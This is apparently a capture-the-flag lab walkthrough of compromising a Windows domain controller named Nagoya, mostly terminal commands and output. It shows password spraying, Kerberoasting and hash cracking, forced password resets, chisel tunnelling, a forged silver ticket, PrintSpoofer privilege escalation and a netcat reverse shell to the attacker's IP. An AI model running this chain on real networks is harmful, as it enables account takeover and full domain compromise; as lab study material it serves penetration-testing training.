+┌──(kali㉿kali)-[~/nagoya]
+└─$ impacket-GetNPUsers -dc-ip 192.168.182.21 -request nagoya-industries.com/ -usersfile username2.txt -format hashcat
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User matthew.harrison doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User emma.miah doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rebecca.bell doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User scott.gardner doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User terry.edwards doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User holly.matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User anne.jenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User brett.naylor doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User melissa.mitchell doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User craig.carr doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User fiona.clark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User patrick.martin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User kate.watson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User kirsty.norris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andrea.hayes doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User abigail.hughes doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User melanie.watson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User frances.ward doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sylvia.king doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User wayne.hartley doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User iain.white doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User joanna.wood doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User bethan.webster doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User elaine.brady doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User christopher.lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User damien.chapman doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User joanne.lewis doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User megan.johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+Every other means I tried to get the password of users failed me and other open ports seem not to help. I started password guessing
+
+username:firstname
+username:lastname
+
+None of them worked.
+
+
+I found "© 2023 - Nagoya - Privacy" on the bottom of the web application, and created a world list from the seasons and year
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ cat password.txt                       
+spring2023
+winter2023
+autumn2023
+summer2023
+Spring2023
+Winter2023
+Autumn2023
+Summer2023
+
+Spraying it netexec, I found two user's passwords
+SMB         192.168.182.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023 
+SMB         192.168.182.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023
+
+RDP and winrm did not work on them, and the shares they are opened to weren't interesting
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nxc smb 192.168.182.21 -u fiona.clark -p Summer2023 --shares     
+SMB         192.168.182.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False) 
+SMB         192.168.182.21  445    NAGOYA           [+] nagoya-industries.com\fiona.clark:Summer2023 
+SMB         192.168.182.21  445    NAGOYA           [*] Enumerated shares
+SMB         192.168.182.21  445    NAGOYA           Share           Permissions     Remark
+SMB         192.168.182.21  445    NAGOYA           -----           -----------     ------
+SMB         192.168.182.21  445    NAGOYA           ADMIN$                          Remote Admin
+SMB         192.168.182.21  445    NAGOYA           C$                              Default share
+SMB         192.168.182.21  445    NAGOYA           IPC$            READ            Remote IPC
+SMB         192.168.182.21  445    NAGOYA           NETLOGON        READ            Logon server share 
+SMB         192.168.182.21  445    NAGOYA           SYSVOL          READ            Logon server share 
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nxc smb 192.168.182.21 -u craig.carr -p Spring2023 --shares
+SMB         192.168.182.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False) 
+SMB         192.168.182.21  445    NAGOYA           [+] nagoya-industries.com\craig.carr:Spring2023 
+SMB         192.168.182.21  445    NAGOYA           [*] Enumerated shares
+SMB         192.168.182.21  445    NAGOYA           Share           Permissions     Remark
+SMB         192.168.182.21  445    NAGOYA           -----           -----------     ------
+SMB         192.168.182.21  445    NAGOYA           ADMIN$                          Remote Admin
+SMB         192.168.182.21  445    NAGOYA           C$                              Default share
+SMB         192.168.182.21  445    NAGOYA           IPC$            READ            Remote IPC
+SMB         192.168.182.21  445    NAGOYA           NETLOGON        READ            Logon server share 
+SMB         192.168.182.21  445    NAGOYA           SYSVOL          READ            Logon server share 
+
+
+I resolved to extract the AD contents and analyse the via bloodhound
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ bloodhound-python -c All -u craig.carr -p 'Spring2023' -d nagoya-industries.com -ns 192.168.182.21 --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: nagoya-industries.com
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: nagoya.nagoya-industries.com
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: nagoya.nagoya-industries.com
+INFO: Found 36 users
+INFO: Found 56 groups
+INFO: Found 2 gpos
+INFO: Found 4 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: nagoya.nagoya-industries.com
+INFO: Done in 00M 09S
+INFO: Compressing output into 20250628105836_bloodhound.zip
+
+During my analysis, I found two users that are kerberoastable accounts, I tried to keberoast them but was only able to get the plaintext password of the svc_mssql account. 
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ impacket-GetUserSPNs nagoya-industries.com/craig.carr:Spring2023 -dc-ip 192.168.182.21 -request -outputfile hashses.kerberoast
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation 
+----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
+http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 09:31:06.190955  <never>                                
+MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 09:45:33.288595  2024-08-02 04:59:53.706593             
+
+
+
+[-] CCache file is not found. Skipping...
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nano hashses.kerberoast                           
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ john hashses.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Service1         (?)     
+1g 0:00:00:05 DONE (2025-06-28 11:07) 0.1808g/s 2593Kp/s 2782Kc/s 2782KC/s !!12Honey..*7¡Vamos!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+I could not make use of this accout anywhere. However, it occourd to me that there is a MSSQL application running on the victim.
+
+More analyses via bloodhound on the "Shortest Paths to Unconstrained Delegation Systems" section shows the following
+
+All employees has generic all permission on the user iain.white, and these user belongs to helpdesk group which also has generic all permission to christopher.lewis. According to bloodhound, this user canPSRemote to the DC.
+
+I exploited these permissions as follows
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ net rpc password "iain.white" "Winter2023" --user='nagoya-industries.com/craig.carr%Spring2023' -S 192.168.182.21
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nxc smb 192.168.182.21 -u iain.white -p Winter2023                                                      
+SMB         192.168.182.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False) 
+SMB         192.168.182.21  445    NAGOYA           [+] nagoya-industries.com\iain.white:Winter2023 
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ net rpc password "christopher.lewis" "Winter2023" --user='nagoya-industries.com/iain.white%Winter2023' -S 192.168.182.21
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ nxc winrm 192.168.182.21 -u christopher.lewis -p Winter2023                                                
+WINRM       192.168.182.21  5985   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.182.21  5985   NAGOYA           [+] nagoya-industries.com\christopher.lewis:Winter2023 (Pwn3d!)
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/nagoya]
+└─$ evil-winrm -i 192.168.182.21 -u christopher.lewis -p Winter2023
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> whoami
+nagoya-ind\christopher.lewis
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> hostname
+nagoya
+
+I was able to submit the first flag.
+
+For privilege escalation, I ran winpease and found nothing interesting.  
+
+Port 1433 that is running on the machine, I could not connect to it from outside.
+
+*Evil-WinRM* PS C:\Users\Christopher.Lewis> netstat -a | findstr 1433
+  TCP    0.0.0.0:1433           nagoya:0               LISTENING
+  TCP    [::]:1433              nagoya:0               LISTENING
+*Evil-WinRM* PS C:\Users\Christopher.Lewis> ls
+
+I did portforwarding with chisel 
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ ./chisel_linux server -p 445 --reverse
+2025/06/29 15:07:19 server: Reverse tunnelling enabled
+2025/06/29 15:07:19 server: Fingerprint zVDfPB5T/JQBOse2rXKk3B2P2J3JHsCbnflfZniMKHQ=
+2025/06/29 15:07:19 server: Listening on http://0.0.0.0:445
+2025/06/29 15:09:09 server: session#1: tun: proxy#R:1433=>1433: Listening
+
+*Evil-WinRM* PS C:\Users\Christopher.Lewis> .\chisel.exe client 192.168.45.240:445 R:1433:127.0.0.1:1433
+chisel.exe : 2025/06/29 06:09:01 client: Connecting to ws://192.168.45.240:445
+    + CategoryInfo          : NotSpecified: (2025/06/29 06:0....168.45.240:445:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+2025/06/29 06:09:01 client: Connected (Latency 45.4236ms)
+
+Then I tried connect to the mssql server using the service account credential that I dumped.
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (NAGOYA-IND\svc_mssql  guest@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
+    show_query                 - show query
+    mask_query                 - mask query
+    
+SQL (NAGOYA-IND\svc_mssql  guest@master)> enable_xp_cmdshell
+ERROR(nagoya\SQLEXPRESS): Line 105: User does not have permission to perform this action.
+ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+ERROR(nagoya\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
+SQL (NAGOYA-IND\svc_mssql  guest@master)> 
+
+I could not execute a command using xp_cmdshell because it requires admin privilege.
+
+Next i did was to construct a silver ticket with the mssql account creds in other to access the service as an admin.
+
+There are 3 items needed to create a silver ticket:
+
+- NTLM hash of svc_mssql user
+- Domain SID,
+- and Target SPN of the service account you’ve compromised
+
+1. I went to https://codebeautify.org/ntlm-hash-generator and generated the ntlm hash of "Service1" which is the password of svc_mssql
+2. For Domain SID, i did
+*Evil-WinRM* PS C:\Users\Christopher.Lewis> Get-AdDomain
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=nagoya-industries,DC=com
+DeletedObjectsContainer            : CN=Deleted Objects,DC=nagoya-industries,DC=com
+DistinguishedName                  : DC=nagoya-industries,DC=com
+DNSRoot                            : nagoya-industries.com
+DomainControllersContainer         : OU=Domain Controllers,DC=nagoya-industries,DC=com
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-1969309164-1513403977-1686805993
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=nagoya-industries,DC=com
+Forest                             : nagoya-industries.com
+InfrastructureMaster               : nagoya.nagoya-industries.com
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=nagoya-industries,DC=com}
+LostAndFoundContainer              : CN=LostAndFound,DC=nagoya-industries,DC=com
+ManagedBy                          :
+Name                               : nagoya-industries
+NetBIOSName                        : NAGOYA-IND
+ObjectClass                        : domainDNS
+ObjectGUID                         : 1153c877-efa1-443b-b59f-c32c9286750e
+ParentDomain                       :
+PDCEmulator                        : nagoya.nagoya-industries.com
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=nagoya-industries,DC=com
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {nagoya.nagoya-industries.com}
+RIDMaster                          : nagoya.nagoya-industries.com
+SubordinateReferences              : {DC=ForestDnsZones,DC=nagoya-industries,DC=com, DC=DomainDnsZones,DC=nagoya-industries,DC=com, CN=Configuration,DC=nagoya-industries,DC=com}
+SystemsContainer                   : CN=System,DC=nagoya-industries,DC=com
+UsersContainer                     : CN=Users,DC=nagoya-industries,DC=com
+
+3. The SPN of svc_user:
+*Evil-WinRM* PS C:\Users\Christopher.Lewis> Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+
+
+DistinguishedName     : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com
+Enabled               : True
+GivenName             : svc_mssql
+Name                  : svc_mssql
+ObjectClass           : user
+ObjectGUID            : df7dda21-173f-4a4a-88ed-70d69481b46e
+SamAccountName        : svc_mssql
+ServicePrincipalNames : {MSSQL/nagoya.nagoya-industries.com}
+SID                   : S-1-5-21-1969309164-1513403977-1686805993-1136
+Surname               :
+UserPrincipalName     : svc_mssql@nagoya-industries.com
+
+#I created the ticket with this command:
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for nagoya-industries.com/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ ls
+20250628105836_bloodhound.zip  PowerView.ps1  agent.exe   chisel_linux       hashses.kerberoast  names.txt  password.txt      username1.txt  users.txt
+Administrator.ccache           Powermad.ps1   chisel.exe  format-plugins.rb  nagoya.txt          pass.txt   username-anarchy  username2.txt  winPEASx64.exe
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ export KRB5CCNAME=$PWD/Administrator.ccache
+
+I created krb5user.conf file in other to allow Kerberos authetication sync from local to remote
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ cat /etc/krb5user.conf                                                                               
+[libdefaults]  
+        default_realm = NAGOYA-INDUSTRIES.COM  
+        kdc_timesync = 1  
+        ccache_type = 4  
+        forwardable = true  
+        proxiable = true  
+    rdns = false  
+    dns_canonicalize_hostname = false  
+        fcc-mit-ticketflags = true  
+  
+[realms]          
+        NAGOYA-INDUSTRIES.COM = {  
+                kdc = nagoya.nagoya-industries.com  
+        }  
+  
+[domain_realm]  
+        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
+
+
+#I used netexec to complete the rest of the exploitation
+#Before that, i modified the /etc/hosts file in a way that the remote DC is now pointing at my localhost IP
+
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ cat /etc/hosts        
+127.0.0.1       localhost
+127.0.1.1       kali
+192.168.169.21  nagoya-industries.com
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 nagoya.nagoya-industries.com
+
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache -x 'whoami'     
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Executed command via mssqlexec
+MSSQL       127.0.0.1       1433   NAGOYA           nagoya-ind\svc_mssql
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache -x 'whoami /priv'
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Executed command via mssqlexec
+MSSQL       127.0.0.1       1433   NAGOYA           PRIVILEGES INFORMATION
+MSSQL       127.0.0.1       1433   NAGOYA           ----------------------
+MSSQL       127.0.0.1       1433   NAGOYA           Privilege Name                Description                               State
+MSSQL       127.0.0.1       1433   NAGOYA           ============================= ========================================= ========
+MSSQL       127.0.0.1       1433   NAGOYA           SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeMachineAccountPrivilege     Add workstations to domain                Disabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeCreateGlobalPrivilege       Create global objects                     Enabled
+MSSQL       127.0.0.1       1433   NAGOYA           SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+                                                                                                                                                                                                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/nagoya]
+└─$ cp /home/kali/Downloads/PrintSpoofer.exe .
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ cp /home/kali/Downloads/nc64.exe .        
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache -x 'dir C:\'     
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Executed command via mssqlexec
+MSSQL       127.0.0.1       1433   NAGOYA           Volume in drive C has no label.
+MSSQL       127.0.0.1       1433   NAGOYA           Volume Serial Number is 4CB9-C891
+MSSQL       127.0.0.1       1433   NAGOYA           Directory of C:\
+MSSQL       127.0.0.1       1433   NAGOYA           04/30/2023  02:07 AM    <DIR>          inetpub
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:06 AM                34 local.txt
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:06 AM               866 output.txt
+MSSQL       127.0.0.1       1433   NAGOYA           04/29/2023  05:38 AM    <DIR>          PerfLogs
+MSSQL       127.0.0.1       1433   NAGOYA           04/30/2023  01:39 AM    <DIR>          Program Files
+MSSQL       127.0.0.1       1433   NAGOYA           04/30/2023  01:39 AM    <DIR>          Program Files (x86)
+MSSQL       127.0.0.1       1433   NAGOYA           04/29/2023  11:41 PM    <DIR>          SQL2022
+MSSQL       127.0.0.1       1433   NAGOYA           04/30/2023  12:37 AM    <DIR>          Temp
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:06 AM    <DIR>          Users
+MSSQL       127.0.0.1       1433   NAGOYA           04/30/2023  12:36 AM    <DIR>          Windows
+MSSQL       127.0.0.1       1433   NAGOYA           2 File(s)            900 bytes
+MSSQL       127.0.0.1       1433   NAGOYA           8 Dir(s)  19,713,335,296 bytes free
+                                                                          
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache --put-file nc64.exe C:\\Temp\\nc.exe
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Copy nc64.exe to C:\Temp\nc.exe
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Size is 45272 bytes
+MSSQL       127.0.0.1       1433   NAGOYA           [+] File has been uploaded on the remote machine
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache --put-file PrintSpoofer.exe C:\\Temp\\print.exe
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Copy PrintSpoofer.exe to C:\Temp\print.exe
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Size is 27136 bytes
+MSSQL       127.0.0.1       1433   NAGOYA           [+] File has been uploaded on the remote machine
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache -x 'dir C:\Temp'                               
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Executed command via mssqlexec
+MSSQL       127.0.0.1       1433   NAGOYA           Volume in drive C has no label.
+MSSQL       127.0.0.1       1433   NAGOYA           Volume Serial Number is 4CB9-C891
+MSSQL       127.0.0.1       1433   NAGOYA           Directory of C:\Temp
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:26 AM    <DIR>          .
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:26 AM    <DIR>          ..
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:26 AM            45,272 nc.exe
+MSSQL       127.0.0.1       1433   NAGOYA           06/29/2025  06:26 AM            27,136 print.exe
+MSSQL       127.0.0.1       1433   NAGOYA           2 File(s)         72,408 bytes
+MSSQL       127.0.0.1       1433   NAGOYA           2 Dir(s)  19,695,083,520 bytes free
+                                                                                                                                                                                               
+┌──(kali㉿kali)-[~/nagoya]
+└─$ netexec mssql 127.0.0.1 --use-kcache -x 'C:\\Temp\\print.exe -c "C:\\Temp\\nc.exe 192.168.45.240 4444 -e cmd"'
+MSSQL       127.0.0.1       1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] nagoya-industries.com\Administrator from ccache (Pwn3d!)
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Executed command via mssqlexec
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Found privilege: SeImpersonatePrivilege
+MSSQL       127.0.0.1       1433   NAGOYA           [+] Named pipe listening...
+MSSQL       127.0.0.1       1433   NAGOYA           [+] CreateProcessAsUser() OK
+
+
+# I got admin shell
+
+┌──(kali㉿kali)-[~/nagoya]
+└─$ sudo rlwrap nc -lnvp 4444 
+[sudo] password for kali: 
+listening on [any] 4444 ...
+connect to [192.168.45.240] from (UNKNOWN) [192.168.169.21] 50093
+Microsoft Windows [Version 10.0.17763.4252]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nagoya-ind\nagoya$
+
+C:\Windows\system32>hostname
+hostname
+nagoya
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>cd users
+cd users
+
+C:\Users>cd administrator
+cd administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 4CB9-C891
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/14/2023  02:53 AM    <DIR>          .
+06/14/2023  02:53 AM    <DIR>          ..
+06/14/2023  02:53 AM                41 email.txt
+06/29/2025  06:06 AM                34 proof.txt
+               2 File(s)             75 bytes
+               2 Dir(s)  19,698,319,360 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+72e13cb8cce8a33532d528e98d42702c
+
+
+
+
+
